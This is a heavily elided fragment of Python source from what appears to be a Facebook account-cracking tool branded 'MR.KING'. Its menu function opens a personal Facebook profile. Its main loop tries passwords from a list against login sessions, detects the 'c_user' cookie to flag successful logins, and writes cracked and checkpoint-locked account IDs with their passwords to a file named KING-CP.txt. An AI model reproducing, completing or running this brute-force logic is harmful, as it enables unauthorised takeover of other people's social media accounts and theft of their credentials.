...
def king():
	...
	if king1 =='4':
		os.system('xdg-open https://www.facebook.com/safdar.baloch.395');king()
	if king1 =='2':
		bangla()
	else:
...
def m1():
    ...
    print('Press Enter to Back');king()
#
def m2():
    user=[]
    os.system('clear')
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[151:166]
                print('\033[1;32m[KING-OK] '+cid+'|'+ps+'\033[0;97m')
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[141:152]
                print('\033[1;31m[KING-CP] '+cid+' | '+ps+'\x1b[1;97m')
                open('KING-CP.txt', 'a').write(uid+' | '+ps+'\n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r[\033[1;97mMR.KING\033[1;97m] %s|\33[1;32mOK:- %s \r'%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass
